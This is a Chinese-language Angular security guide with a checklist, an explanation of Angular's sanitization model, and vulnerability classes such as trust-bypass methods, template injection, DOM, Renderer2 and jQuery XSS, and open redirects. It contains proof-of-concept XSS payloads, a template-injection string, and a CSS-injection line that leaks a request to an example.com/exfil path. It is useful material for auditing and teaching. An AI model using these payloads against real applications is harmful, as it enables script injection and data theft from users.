# Angular安全

# 检查清单

验证以下内容：

- [ ] Angular被视为客户端框架，不应提供服务器端保护
- [ ] 项目配置中禁用了脚本的Sourcemap
- [ ] 不可信任的用户输入在使用模板之前始终进行插值或清理
- [ ] 用户无法控制服务器端或客户端模板
- [ ] 不可信任的用户输入在被应用程序信任之前使用适当的安全上下文进行清理
- [ ] 不要将不可信任的输入与`BypassSecurity*`方法一起使用
- [ ] 不要将不可信任的用户输入传递给Angular类，如`ElementRef`，`Renderer2`和`Document`，或其他JQuery/DOM接收器

# 什么是Angular

Angular是一个强大的前端框架，广泛用于构建动态Web应用程序。它是开源的，并由Google维护。Angular的一个关键特性是其使用TypeScript，这是一种类型化的JavaScript超集，使代码更易于阅读、维护和调试。

Angular的安全机制旨在防止常见的客户端漏洞，包括跨站脚本攻击（XSS）和开放重定向。然而，Angular也可以在服务器端用于生成静态页面。因此，应从两个方面考虑Angular的安全性。

# 框架架构

为了更好地理解Angular的基本概念，让我们了解一下它的基本结构。

通常，Angular项目的结构如下：
```bash
my-workspace/
├── ... #workspace-wide configuration files
├── src
│   ├── app
│   │   ├── app.module.ts #defines the root module, that tells Angular how to assemble the application
│   │   ├── app.component.ts #defines the logic for the application's root component
│   │   ├── app.component.html #defines the HTML template associated with the root component
│   │   ├── app.component.css #defines the base CSS stylesheet for the root component
│   │   ├── app.component.spec.ts #defines a unit test for the root component
│   │   └── app-routing.module.ts #provides routing capability for the application
│   ├── lib
│   │   └── src #library-specific configuration files
│   ├── index.html #main HTML page, where the component will be rendered in
│   └── ... #application-specific configuration files
├── angular.json #provides workspace-wide and project-specific configuration defaults
└── tsconfig.json #provides the base TypeScript configuration for projects in the workspace
```
根据文档，每个Angular应用程序至少有一个组件，即根组件（`AppComponent`），它将组件层次结构与DOM连接起来。每个组件定义一个包含应用程序数据和逻辑的类，并与定义在目标环境中显示的视图的HTML模板相关联。`@Component()`装饰器将其下方的类标识为组件，并提供模板和相关的组件特定元数据。`AppComponent`在`app.component.ts`文件中定义。

Angular NgModules为一组组件声明了一个编译上下文，该上下文专用于应用程序域、工作流程或密切相关的一组功能。每个Angular应用程序都有一个根模块，通常命名为`AppModule`，它提供了启动应用程序的引导机制。一个应用程序通常包含许多功能模块。`AppModule`在`app.module.ts`文件中定义。

Angular的`Router` NgModule提供了一个服务，允许您在应用程序中定义不同应用程序状态和视图层次之间的导航路径。`RouterModule`在`app-routing.module.ts`文件中定义。

对于与特定视图无关的数据或逻辑，并且您希望在组件之间共享，可以创建一个服务类。服务类定义之前紧跟着`@Injectable()`装饰器。该装饰器提供了元数据，允许其他提供者作为依赖项注入到您的类中。依赖注入（DI）使您的组件类保持精简和高效。它们不会从服务器获取数据，验证用户输入或直接记录到控制台；它们将这些任务委托给服务。

# Sourcemap配置

Angular框架通过遵循`tsconfig.json`选项将TypeScript文件转换为JavaScript代码，然后使用`angular.json`配置构建项目。查看`angular.json`文件，我们观察到一个选项可以启用或禁用sourcemap。根据Angular文档， 默认配置启用了脚本的sourcemap文件，并且默认情况下不隐藏：
```json
"sourceMap": {
"scripts": true,
"styles": true,
"vendor": false,
"hidden": false
}
```
通常，sourcemap文件用于调试目的，将生成的文件映射到其原始文件。因此，不建议在生产环境中使用它们。如果启用了sourcemap，它可以提高可读性，并通过复制Angular项目的原始状态来帮助文件分析。然而，如果禁用了它们，审阅者仍然可以通过手动搜索反安全模式来分析编译后的JavaScript文件。

此外，可以在浏览器开发工具→源代码（或调试器和源代码）→[id].main.js中找到带有Angular项目的编译后的JavaScript文件。根据启用的选项，此文件可能在末尾包含以下行`//# sourceMappingURL=[id].main.js.map`，或者如果将**hidden**选项设置为**true**，则可能不包含此行。然而，如果对**scripts**禁用了sourcemap，测试变得更加复杂，我们无法获取该文件。此外，可以在项目构建期间启用sourcemap，例如`ng build --source-map`。

# 数据绑定

绑定是指组件与其对应视图之间的通信过程。它用于在Angular框架中传输数据。数据可以通过各种方式传递，例如通过事件、插值、属性或通过双向绑定机制。此外，数据还可以在相关组件（父子关系）之间和两个不相关的组件之间共享，使用Service功能。

我们可以通过数据流来分类绑定：

- 数据源到视图目标（包括*插值*、*属性*、*属性*、*类*和*样式*）；可以在模板中使用`[]`或`{{}}`应用；
- 视图目标到数据源（包括*事件*）；可以在模板中使用`()`应用；
- 双向绑定；可以在模板中使用`[()]`应用。

绑定可以应用于属性、事件和属性，以及源指令的任何公共成员：

| 类型     | 目标            | 示例 |
| -------- | ----------------- | -------- |
| 属性 | 元素属性、组件属性、指令属性 | <img [alt]="hero.name" [src]="heroImageUrl"> |
| 事件 | 元素事件、组件事件、指令事件 | <button type="button" (click)="onSave()">Save</button> |
| 双向绑定 | 事件和属性 | <input [(ngModel)]="name"> |
| 属性 | 属性（例外） | <button type="button" [attr.aria-label]="help">help</button> |
| 类 | 类属性 | <div [class.special]="isSpecial">Special</div> |
| 样式 | 样式属性 | <button type="button" [style.color]="isSpecial ? 'red' : 'green'"> |

# Angular安全模型

Angular的设计默认包括对所有数据进行编码或净化，使得在Angular项目中发现和利用XSS漏洞变得越来越困难。数据处理有两种不同的情况：

1. 插值或`{{user_input}}`-根据上下文进行编码，并将用户输入解释为文本；

```jsx
//app.component.ts
test = "<script>alert(1)</script><h1>test</h1>";

//app.component.html
{{test}}
```

结果：`&lt;script&gt;alert(1)&lt;/script&gt;&lt;h1&gt;test&lt;/h1&gt;`

2. 绑定到属性、属性、类和样式或`[attribute]="user_input"`-根据提供的安全上下文进行净化。

```jsx
//app.component.ts
test = "<script>alert(1)</script><h1>test</h1>";

//app.component.html
<div [innerHtml]="test"></div>
```

结果：`<div><h1>test</h1></div>`


有6种`SecurityContext`类型：

- `None`；
- `HTML`用于将值解释为HTML时使用；
- `STYLE`用于将CSS绑定到`style`属性时使用；
- `URL`用于URL属性，例如`<a href>`；
- `SCRIPT`用于JavaScript代码；
- `RESOURCE_URL`用于作为代码加载和执行的URL，例如`<script src>`。

# 漏洞

## 绕过安全信任方法

Angular引入了一系列方法来绕过其默认的净化过程，并指示某个值可以在特定上下文中安全使用，如以下五个示例所示：

1. `bypassSecurityTrustUrl`用于指示给定的值是安全的样式URL：

```jsx
//app.component.ts
this.trustedUrl = this.sanitizer.bypassSecurityTrustUrl('javascript:alert()');

//app.component.html
<a class="e2e-trusted-url" [href]="trustedUrl">Click me</a>

//result
<a _ngcontent-pqg-c12="" class="e2e-trusted-url" href="javascript:alert()">Click me</a>
```

2. `bypassSecurityTrustResourceUrl`用于指示给定的值是安全的资源URL：

```jsx
//app.component.ts
this.trustedResourceUrl = this.sanitizer.bypassSecurityTrustResourceUrl("https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png");

//app.component.html
<iframe [src]="trustedResourceUrl"></iframe>

//result
<img _ngcontent-nre-c12="" src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png">
```

3. `bypassSecurityTrustHtml`用于指示给定的值是安全的HTML。请注意，以这种方式将`script`元素插入DOM树不会导致执行其中的JavaScript代码，因为这些元素是如何添加到DOM树中的。

```jsx
//app.component.ts
this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml("<h1>html tag</h1><svg onclick=\"alert('bypassSecurityTrustHtml')\" style=display:block>blah</svg>");

//app.component.html
<p style="border:solid" [innerHtml]="trustedHtml"></p>

//result
<h1>html tag</h1>
<svg onclick="alert('bypassSecurityTrustHtml')" style="display:block">blah</svg>
```

4. `bypassSecurityTrustScript`用于指示给定的值是安全的JavaScript。然而，我们发现它的行为是不可预测的，因为我们无法使用此方法在模板中执行JS代码。

```jsx
//app.component.ts
this.trustedScript = this.sanitizer.bypassSecurityTrustScript("alert('bypass Security TrustScript')");

//app.component.html
<script [innerHtml]="trustedScript"></script>

//result
-
```

1. `bypassSecurityTrustStyle`用于指示给定的值是安全的CSS。以下示例说明了CSS注入：

```jsx
//app.component.ts
this.trustedStyle = this.sanitizer.bypassSecurityTrustStyle('background-image: url(https://example.com/exfil/a)');

//app.component.html
<input type="password" name="pwd" value="01234" [style]="trustedStyle">

//result
Request URL: GET example.com/exfil/a
```

Angular提供了一个`sanitize`方法，在显示之前对数据进行净化。该方法根据提供的安全上下文进行净化输入。然而，对于特定的数据和上下文，使用正确的安全上下文非常重要。例如，在HTML内容上应用具有`SecurityContext.URL`的净化器不能防止危险的HTML值。在这种情况下，滥用安全上下文可能导致XSS漏洞。
## HTML注入

当用户输入绑定到以下三个属性之一时，就会出现此漏洞：`innerHTML`，`outerHTML`或`iframe` `srcdoc`。尽管绑定到这些属性会将HTML解释为它本身，但输入会使用`SecurityContext.HTML`进行清理。因此，HTML注入是可能的，但跨站脚本（XSS）不是。

使用`innerHTML`的示例：
```jsx
//app.component.ts
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html'
})
export class AppComponent{
//define a variable with user input
test = "<script>alert(1)</script><h1>test</h1>";
}

//app.component.html
<div [innerHTML]="test"></div>
```
结果是 `<div><h1>test</h1></div>`。

## 模板注入

### 客户端渲染（CSR）

Angular利用模板来动态构建页面。该方法涉及将Angular要评估的模板表达式放在双花括号（`{{}}`）中。通过这种方式，框架提供了额外的功能。例如，一个模板表达式`{{1+1}}`将显示为2。

通常情况下，Angular会对可能与模板表达式混淆的用户输入进行转义（例如，字符`< > ' " ``）。这意味着需要采取额外的步骤来规避此限制，例如使用生成JavaScript字符串对象的函数来避免使用被列入黑名单的字符。然而，为了实现这一点，我们必须考虑Angular的上下文、其属性和变量。因此，模板注入攻击可能如下所示：
```jsx
//app.component.ts
const _userInput = '{{constructor.constructor(\'alert(1)\'()}}'
@Component({
selector: 'app-root',
template: '<h1>title</h1>' + _userInput
})
```
如上所示：`constructor`指的是对象`constructor`属性的作用域，使我们能够调用String构造函数并执行任意代码。

### 服务器端渲染（SSR）

与在浏览器的DOM中发生的客户端渲染（CSR）不同，Angular Universal负责对模板文件进行服务器端渲染。然后将这些文件传递给用户。尽管有这个区别，Angular Universal使用与CSR相同的净化机制来增强SSR的安全性。在SSR中，可以像在CSR中一样通过检测使用的模板语言来发现模板注入漏洞。

当使用第三方模板引擎（如Pug和Handlebars）时，也有可能引入新的模板注入漏洞。

## XSS

### DOM接口

如前所述，我们可以直接使用*Document*接口访问DOM。如果用户输入没有事先进行验证，可能会导致跨站脚本（XSS）漏洞。

我们在下面的示例中使用了`document.write()`和`document.createElement()`方法：
```jsx
//app.component.ts 1
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
template: ''
})
export class AppComponent{
constructor () {
document.open();
document.write("<script>alert(document.domain)</script>");
document.close();
}
}

//app.component.ts 2
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
template: ''
})
export class AppComponent{
constructor () {
var d = document.createElement('script');
var y = document.createTextNode("alert(1)");
d.appendChild(y);
document.body.appendChild(d);
}
}

//app.component.ts 3
import { Component} from '@angular/core';

@Component({
selector: 'app-root',
template: ''
})
export class AppComponent{
constructor () {
var a = document.createElement('img');
a.src='1';
a.setAttribute('onerror','alert(1)');
document.body.appendChild(a);
}
}
```
### Angular类

在Angular中，有一些类可以用来处理DOM元素：`ElementRef`、`Renderer2`、`Location`和`Document`。关于后两个类的详细描述在**开放重定向**部分中给出。前两个类的主要区别在于，`Renderer2` API在DOM元素和组件代码之间提供了一层抽象，而`ElementRef`只是保存了对元素的引用。因此，根据Angular文档，只有在需要直接访问DOM时，才应该使用`ElementRef` API。

- `ElementRef`包含`nativeElement`属性，可以用来操作DOM元素。然而，不正确使用`nativeElement`可能导致XSS注入漏洞，如下所示：

```tsx
//app.component.ts
import { Component, ElementRef, ViewChild, AfterViewInit } from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {
...
constructor(private elementRef: ElementRef) {
const s = document.createElement('script');
s.type = 'text/javascript';
s.textContent = 'alert("Hello World")';
this.elementRef.nativeElement.appendChild(s);
}
}
```

- 尽管`Renderer2`提供的API可以安全地在不支持直接访问原生元素的情况下使用，但它仍然存在一些安全缺陷。使用`Renderer2`，可以使用`setAttribute()`方法在HTML元素上设置属性，该方法没有XSS预防机制。

```tsx
//app.component.ts
import {Component, Renderer2, ElementRef, ViewChild, AfterViewInit } from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {

public constructor (
private renderer2: Renderer2
){}
@ViewChild("img") img!: ElementRef;

addAttribute(){
this.renderer2.setAttribute(this.img.nativeElement, 'src', '1');
this.renderer2.setAttribute(this.img.nativeElement, 'onerror', 'alert(1)');
}
}

//app.component.html
<img #img>
<button (click)="setAttribute()">Click me!</button>
```

- 要设置DOM元素的属性，可以使用`Renderer2.setProperty()`方法并触发XSS攻击：

```tsx
//app.component.ts
import {Component, Renderer2, ElementRef, ViewChild, AfterViewInit } from '@angular/core';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {

public constructor (
private renderer2: Renderer2
){}
@ViewChild("img") img!: ElementRef;

setProperty(){
this.renderer2.setProperty(this.img.nativeElement, 'innerHTML', '<img src=1 onerror=alert(1)>');
}
}

//app.component.html
<a #a></a>
<button (click)="setProperty()">Click me!</button>
```


在我们的研究中，我们还研究了其他`Renderer2`方法（如`setStyle()`、`createComment()`和`setValue()`）在XSS和CSS注入方面的行为。然而，由于它们的功能限制，我们无法找到这些方法的任何有效攻击向量。

### jQuery

jQuery是一个快速、小巧且功能丰富的JavaScript库，可以在Angular项目中用于操作HTML DOM对象。然而，众所周知，该库的方法可能被利用以实现XSS漏洞。为了讨论一些易受攻击的jQuery方法在Angular项目中如何被利用，我们添加了这个小节。

- `html()`方法获取匹配元素集合中第一个元素的HTML内容，或设置每个匹配元素的HTML内容。然而，根据设计，任何接受HTML字符串的jQuery构造函数或方法都有可能执行代码。这可以通过注入`<script>`标签或使用执行代码的HTML属性来实现，如下例所示。

```tsx
//app.component.ts
import { Component, OnInit } from '@angular/core';
import * as $ from 'jquery';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit
{
ngOnInit()
{
$("button").on("click", function()
{
$("p").html("<script>alert(1)</script>");
});
}
}

//app.component.html
<button>Click me</button>
<p>some text here</p>
```

- `jQuery.parseHTML()`方法使用原生方法将字符串转换为一组DOM节点，然后可以将其插入到文档中。

```tsx
jQuery.parseHTML(data [, context ] [, keepScripts ])
```

如前所述，大多数接受HTML字符串的jQuery API将运行在HTML中包含的脚本。除非显式设置`keepScripts`为`true`，否则`jQuery.parseHTML()`方法不会运行解析的HTML中的脚本。然而，在大多数环境中，仍然可以间接执行脚本；例如，通过`<img onerror>`属性。

```tsx
//app.component.ts
import { Component, OnInit } from '@angular/core';
import * as $ from 'jquery';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent implements OnInit
{
ngOnInit()
{
$("button").on("click", function()
{
var $palias = $("#palias"),
str = "<img src=1 onerror=alert(1)>",
html = $.parseHTML(str),
nodeNames = [];
$palias.append(html);
});
}
}

//app.component.html
<button>Click me</button>
<p id="palias">some text</p>
```

## 开放重定向

### DOM接口

根据W3C文档，`window.location`和`document.location`对象在现代浏览器中被视为别名。这就是为什么它们具有一些方法和属性的类似实现，这可能导致开放重定向和使用`javascript://`模式的DOM XSS攻击，如下所示。

- `window.location.href`（和`document.location.href`）

获取当前DOM位置对象的规范方式是使用`window.location`。它也可以用于将浏览器重定向到新页面。因此，控制这个对象使我们能够利用开放重定向漏洞。

```tsx
//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.location.href = "https://google.com/about"
}
}

//app.component.html
<button type="button" (click)="goToUrl()">Click me!</button>
```

对于以下情况，利用过程是相同的。

- `window.location.assign()`（和`document.location.assign()`）

该方法导致窗口加载并显示指定URL的文档。如果我们控制这个方法，它可能成为开放重定向攻击的漏洞点。

```tsx
//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.location.assign("https://google.com/about")
}
}
```

- `window.location.replace()`（和`document.location.replace()`）

该方法用提供的URL替换当前资源。

这与`assign()`方法的不同之处在于，使用`window.location.replace()`后，当前页面将不会保存在会话历史中。然而，当我们控制这个方法时，仍然有可能利用开放重定向漏洞。

```tsx
//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.location.replace("http://google.com/about")
}
}
```

- `window.open()`

`window.open()`方法接受一个URL，并将其标识的资源加载到新的或现有的标签页或窗口中。控制这个方法也可能是触发XSS或开放重定向漏洞的机会。

```tsx
//app.component.ts
...
export class AppComponent {
goToUrl(): void {
window.open("https://google.com/about", "_blank")
}
}
```
### Angular类

- 根据Angular文档，Angular `Document`与DOM文档相同，这意味着可以使用常见的DOM文档向量来利用Angular中的客户端漏洞。`Document.location`属性和方法可能是成功的开放重定向攻击的漏洞点，如下例所示：

```tsx
//app.component.ts
import { Component, Inject } from '@angular/core';
import { DOCUMENT } from '@angular/common';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css']
})
export class AppComponent {
constructor(@Inject(DOCUMENT) private document: Document) { }

goToUrl(): void {
this.document.location.href = 'https://google.com/about';
}
}

//app.component.html
<button type="button" (click)="goToUrl()">点击我！</button>
```

- 在研究阶段，我们还审查了Angular `Location`类以查找开放重定向漏洞，但没有找到有效的向量。`Location`是一个Angular服务，应用程序可以使用它与浏览器的当前URL进行交互。该服务有几种方法来操作给定的URL - `go()`，`replaceState()`和`prepareExternalUrl()`。然而，我们不能将它们用于重定向到外部域。例如：

```tsx
//app.component.ts
import { Component, Inject } from '@angular/core';
import {Location, LocationStrategy, PathLocationStrategy} from '@angular/common';

@Component({
selector: 'app-root',
templateUrl: './app.component.html',
styleUrls: ['./app.component.css'],
providers: [Location, {provide: LocationStrategy, useClass: PathLocationStrategy}],
})
export class AppComponent {
location: Location;
constructor(location: Location) {
this.location = location;
}
goToUrl(): void {
console.log(this.location.go("http://google.com/about"));
}
}
```

结果：`http://localhost:4200/http://google.com/about`

- Angular `Router`类主要用于在同一域内导航，不会引入任何额外的应用程序漏洞：

```jsx
//app-routing.module.ts
const routes: Routes = [
{ path: '', redirectTo: 'https://google.com', pathMatch: 'full' }]
```

结果：`http://localhost:4200/https:`

以下方法也在域范围内导航：

```jsx
const routes: Routes = [ { path: '', redirectTo: 'ROUTE', pathMatch: 'prefix' } ]
this.router.navigate(['PATH'])
this.router.navigateByUrl('URL')
```

# 参考资料
- [Angular](https://angular.io/)
- [Angular安全性：权威指南（第1部分）](https://lsgeurope.com/post/angular-security-the-definitive-guide-part-1)
- [Angular安全性：权威指南（第2部分）](https://lsgeurope.com/post/angular-security-the-definitive-guide-part-2)
- [Angular安全性：权威指南（第3部分）](https://lsgeurope.com/post/angular-security-the-definitive-guide-part-3)
- [Angular安全性：检查清单](https://lsgeurope.com/post/angular-security-checklist)
- [工作区和项目文件结构](https://angular.io/guide/file-structure)
- [组件和模板简介](https://angular.io/guide/architecture-components)
- [源映射配置](https://angular.io/guide/workspace-config#source-map-configuration)
- [绑定语法](https://angular.io/guide/binding-syntax)
- [Angular上下文：嵌套组件树和路由器出口的简单数据绑定](https://medium.com/angular-in-depth/angular-context-easy-data-binding-for-nested-component-trees-and-the-router-outlet-a977efacd48)
- [清理和安全上下文](https://angular.io/guide/security#sanitization-and-security-contexts)
- [GitHub - angular/dom_security_schema.ts](https://github.com/angular/angular/blob/main/packages/compiler/src/schema/dom_security_schema.ts)
- [Angular和AngularJS中的XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md)
- [Angular Universal](https://angular.io/guide/universal)
- [DOM XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss)
- [Angular ElementRef](https://angular.io/api/core/ElementRef)
- [Angular Renderer2](https://angular.io/api/core/Renderer2)
- [Renderer2示例：在Angular中操作DOM - TekTutorialsHub](https://www.tektutorialshub.com/angular/renderer2-angular/)
- [jQuery API文档](http://api.jquery.com/)
- [如何在Angular中使用jQuery（当你绝对需要时）](https://blog.bitsrc.io/how-to-use-jquery-with-angular-when-you-absolutely-have-to-42c8b6a37ff9)
- [Angular Document](https://angular.io/api/common/DOCUMENT)
- [Angular Location](https://angular.io/api/common/Location)
- [Angular Router](https://angular.io/api/router/Router)
